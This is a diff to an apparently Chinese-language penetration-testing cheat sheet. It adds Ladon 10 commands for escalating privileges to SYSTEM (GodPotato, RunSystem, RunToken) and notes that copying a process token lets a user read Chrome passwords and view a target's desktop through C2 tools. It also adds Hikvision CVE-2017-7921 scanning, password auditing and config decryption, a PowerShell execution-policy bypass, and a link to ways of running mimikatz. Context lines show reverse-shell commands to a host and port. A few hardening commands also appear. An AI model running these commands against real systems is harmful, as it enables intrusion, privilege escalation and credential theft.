@@ -242,6 +242,86 @@ Ladon ReverseTcp 192.168.1.8 4444 shell
 Ladon ReverseTcp 192.168.1.8 4444 meter
 ```
 
+#### Ladon 10
+* 0x001 GodPotato提权
+
+支持: Win8-Win11/Win2012-2022服务提权至SYSTEM
+
+```sh
+Ladon GodPotato whoami
+```
+
+* 0x002 hikvision
+
+```
+0x002 hikvision 海康威视 CVE-2017-7921漏洞检测
+
+Ladon 192.168.1.8/24 HikvisionPoc
+Ladon http://192.168.1.8:8080 HikvisionPoc
+Ladon url.txt HikvisionPoc
+
+0x003 hikvision 海康威视 密码审计
+
+Ladon 192.168.1.8/24 HikvisionScan
+Ladon http://192.168.1.8:8080 HikvisionScan
+Ladon url.txt HikvisionScan
+
+
+0x004 hikvision 海康威视 配置文件解密
+
+存在CVE-2017-7921漏洞，可下载配置文件，使用以下命令解密
+
+Ladon HikvisionDecode configurationFile
+```
+* 0x005 RunSystem提权
+```sh
+Ladon RunSystem cmd.exe
+Ladon RunUser cmd.exe
+Ladon RunSystem c:\1.exe
+```
+
+0x006 RunToken复制令牌
+
+复制指定进程令牌执行任意程序，system权限下，某些工具无法直接使用，如Chrome密码读取，未做降权处理的工具将无法读取，使用Runtoken模块可复制对应进程令牌执行，如explorer进程，切换后除了可以读取密码外，还能让VNC等或未做降权的C2程序可查看目标远程桌面，实际使用将cmd.exe替换成全路径的自定义exe即可，若是存在多个参数可以使用bat文件来执行。
+
+```sh
+Ladon RunToken explorer cmd.exe
+Ladon RunToken explorer c:\1.bat
+```
+
+* 0x008  彻底关闭SMB、禁用445 阻止0day、横向移动、中继攻击等
+```sh
+Ladon Load CloseSMB
+```
+* 0x009  Safe008一键安全加固工具
+
+* 0x009  禁用指定服务 
+```sh
+Ladon DisService Spooler
+Ladon DisableService Spooler
+```
+
+* 0x010  停止指定服务
+```sh
+Ladon StopService Spooler
+```
+
+* 0x011 放行端口、阻止端口
+```sh
+Ladon OpenTCP  445
+Ladon OpenUDP  161
+Ladon CloseTCP  445
+Ladon CloseUDP  161
+```
+* 0x012  PowerShell用法
+```sh
+powershell -exec bypass Import-Module .\Ladon.ps1;Ladon whoami
+```
+powershell版使用同样非常简单，只需最后的“Ladon whoami”命令，替换成你想要执行的命令即可，
+
+
+
+
 # proxy代理
 多层代理攻击方式
 1. proxychains
@@ -698,6 +778,7 @@ mstsc /admin /v:192.168.50.153:33089
 ```
 
 ## mimikatz
+[64种运行mimikatz的方法(含Bypass）](https://mp.weixin.qq.com/s/942pnjjTXvscIe6VErsKFw)
 
 ```bash
 # multirdp
